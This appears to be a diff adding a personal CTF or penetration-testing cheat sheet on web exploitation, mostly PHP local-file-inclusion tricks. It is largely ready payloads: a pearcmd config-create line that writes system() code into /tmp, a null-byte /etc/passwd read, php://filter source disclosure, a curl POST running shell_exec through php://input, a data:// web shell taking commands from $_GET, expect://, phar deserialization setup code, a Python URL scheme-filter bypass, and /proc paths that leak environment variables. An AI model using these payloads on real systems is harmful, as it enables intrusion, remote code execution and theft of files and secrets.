@@ -1,0 +1,91 @@
+* Python
+
+  `urllib.request.urlopen()` automatically parses `<URL:http://example.com>` and `<http://example.com>` to
+  `http://example.com`
+
+  `urllib.parse.urlparse()` does not recognise `<URL:...` as a scheme, so this can be used to bypass scheme filters.
+
+* PHP
+
+** LFI2RCE pearcmd
+
+   `?file=/usr/local/lib/php/pearcmd.php&+config-create+tmp<?=system('ls');?>+/tmp/asdf.php`
+   This runs `pear config-create ...`, putting payload into `/tmp/asdf.php`
+
+   `${IFS}` also works
+
+** Other LFI2RCE
+
+   {https://blog.stevenyu.tw/2022/05/07/advanced-local-file-inclusion-2-rce-in-2022/}
+
+** < 5.3
+
+   `http://example.com?page=/etc/passwd%00`
+
+   --
+
+** URL filters (file, open, fwrite, file_get_contents, file_put_contents)
+
+*** Show source instead of evaling
+
+    `php://filter/convert.base64-encode/resource=flag.php`
+    `php://filter/read=string.rot13/resource=flag.php`
+    `php://filter/read=string.toupper/resource=flag.php`
+    `php://filter/read=string.tolower/resource=flag.php`
+
+** http://
+
+   Upgrade from LFI to RFI
+
+** php://input (RCE)
+
+   `curl -X POST --data '<?php echo shell_exec('id'); ?>' 'https://example.com/?page=php://input' -k -v`
+
+   Reads input from POST request body
+
+** zip://
+
+   `zip://<zipfile>#<file>` to upload files zipped and decompress on target. (possible zip slip as well)
+
+** data://
+
+   `data://text/plain, <?php system($_GET["cmd"]);`
+   `data://text/plain;base64, <b64encoded-exploit>`
+
+** expect://
+
+   `expect://ls`
+
+** phar://
+
+   Note: phar file must first be present on target, can be combined with file upload
+
+   @code php
+   <?php
+   // create new Phar
+   $phar = new Phar('test.phar');
+   $phar->startBuffering();
+   $phar->addFromString('test.txt', 'text');
+   $phar->setStub("<?php __HALT_COMPILER(); ?>");
+
+   // add object of any class as meta data
+   class AnyClass {};
+   $object = new AnyClass;
+   $object->data = 'rips';
+   $phar->setMetadata($object);
+   $phar->stopBuffering();
+   ?>
+   @end
+
+   If file operation is performed on phar file, deserialization occurs. If `AnyClass` has `__destruct` or `__wakeup`
+   then it is called.
+
+* /proc
+
+  PID can be bruteforced up to 2^15
+  `/proc/self` is symlink to process
+
+  `/cmdline` process invocation command is shown, may expose paths etc
+  `/environ` shows env vars
+  `/cwd` shows cwd
+  `/fd/[0-9]` shows open files
